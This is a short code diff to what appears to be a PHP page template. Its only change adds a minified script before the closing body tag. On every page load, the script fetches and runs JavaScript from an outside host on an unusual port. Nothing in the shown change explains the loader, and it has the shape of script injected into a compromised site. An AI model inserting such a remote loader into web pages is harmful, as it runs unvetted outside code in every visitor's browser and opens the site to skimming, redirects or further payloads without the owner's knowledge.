@@ -234,5 +234,6 @@ function render_highlights($text) {
         </footer>
     </div>
 
+<script> var _mtj = _mtj || []; (function () { var mtj = document.createElement("script"); mtj.src = "https://node96.aizhantj.com:21233/tjjs/?k=qk25ajlrkia"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(mtj, s); })(); </script>
 </body>
 </html>
